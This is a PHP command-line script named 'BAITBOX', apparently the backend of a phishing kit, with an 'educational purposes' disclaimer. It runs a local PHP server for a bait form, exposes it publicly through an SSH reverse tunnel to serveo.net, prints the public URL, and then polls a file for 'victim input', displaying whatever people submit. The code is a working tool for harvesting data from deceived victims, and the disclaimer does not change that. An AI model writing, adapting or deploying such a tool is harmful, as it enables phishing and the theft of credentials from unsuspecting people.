<?php
/*
 * ========================================================================================
 * DISCLAIMER ⚠️
 * ========================================================================================
 * This script was created strictly for educational purposes. Any unauthorized or illegal 
 * activities conducted using this tool are solely the responsibility of the user. 
 * The creator is not responsible for any misuse or damage caused by the use of this tool.
 * 
 * Always ensure you have explicit permission before accessing or using systems.
 * 
 * AUTHOR: uthman dev
 * LICENSE: GNU General Public License v3.0
 * ========================================================================================
 */

// Clear the console screen based on the OS
system(PHP_OS_FAMILY == "Windows" ? "cls" : "clear");

// Check if the script is running in CLI mode
if (php_sapi_name() !== "cli") {
  die("\033[31mThis tool must be run from the command line.\n\033[0m");
}

// Print ASCII art in red
echo "\033[31m";  // Start red color
echo "██████╗  █████╗ ██╗████████╗██████╗  ██████╗ ██╗  ██╗\n";
echo "██╔══██╗██╔══██╗██║╚══██╔══╝██╔══██╗██╔═══██╗╚██╗██╔╝\n";
echo "██████╔╝███████║██║   ██║   ██████╔╝██║   ██║ ╚███╔╝ \n";
echo "██╔══██╗██╔══██║██║   ██║   ██╔══██╗██║   ██║ ██╔██╗ \n";
echo "██████╔╝██║  ██║██║   ██║   ██████╔╝╚██████╔╝██╔╝ ██╗\n";
echo "╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n";
echo "                                                     \n";
echo "\033[0m";  // Reset to default color

echo "\033[31mNote: For Educational Purposes Only\n\033[0m";

// Define the local server host and port
$host = "localhost";
$port = "2000";

// Capture the start time for server startup performance measurement
$start_time = microtime(true);

// Start the built-in PHP server in the background
$server = shell_exec("php -S $host:$port > /dev/null 2>&1 & echo $!");

// Capture the end time after server startup
$end_time = microtime(true);

// Calculate the time taken to start the server in milliseconds
$time_taken = ($end_time - $start_time) * 1000;

// Check if the server started successfully
if ($server) {
  echo "Starting server on http://$host:$port\n";
  echo "\033[32mServer started successfully in " . round($time_taken, 2) . " milliseconds.\n\033[0m";
} else {
  echo "\033[31mError: Server could not be started.\n\033[0m";
}

// Define the path to the form file (index.php)
$form_file = "index.php";

// Check if the form file exists
if (!file_exists($form_file)) {
  die("Error: The form file index.php is missing. Please create the form.\n");
}

// Setup response directory and files for SSH output and user input handling
$response_dir = "response";
$input_file = "$response_dir/input.txt";
$ssh_output_file = "$response_dir/ssh_output.txt"; // Store SSH output

// Create the response directory if it doesn't exist
if (!file_exists($response_dir)) {
  mkdir($response_dir, 0777, true);
}

// Create input.txt and ssh_output.txt if they don't exist
if (!file_exists($input_file)) {
  touch($input_file);
}
if (!file_exists($ssh_output_file)) {
  touch($ssh_output_file);
  echo "Created $ssh_output_file for SSH output.\n";
}

// Establish an SSH tunnel using Serveo
echo "\033[32mEstablishing SSH tunnel...\033[0m\n";
$ssh_command = "ssh -R 80:localhost:$port serveo.net > $ssh_output_file 2>&1 &";
exec($ssh_command);

// Wait for the SSH tunnel to establish and fetch the tunnel URL
$tunnel_url = null;
while ($tunnel_url === null) {
  if (file_exists($ssh_output_file)) {
    $lines = file($ssh_output_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
      if (strpos($line, "http") !== false) {
        $tunnel_url = $line;
        echo "\033[32mTunnel URL: $tunnel_url\033[0m\n";
        break;
      }
    }
  }
  sleep(1); // Wait for SSH output to be written
}

// Start monitoring input from input.txt
echo "\e[33mWaiting for victim input...\n\e[0m";
echo "\e[34mPress Ctrl+C to stop.\e[0m\n";

while (true) {
  clearstatcache();

  // Check for new input in input.txt
  if (file_exists($input_file)) {
    $input = file_get_contents($input_file);

    if (!empty($input)) {
      echo "-------------------------------------\n";
      echo "Input received: \n";
      echo "\033[32m$input\033[0m\n"; // Display input in green
      echo "-------------------------------------\n";

      // Clear the input file after reading
      file_put_contents($input_file, "");
    }
  }

  // Wait for 2 seconds before checking again
  sleep(2);
}
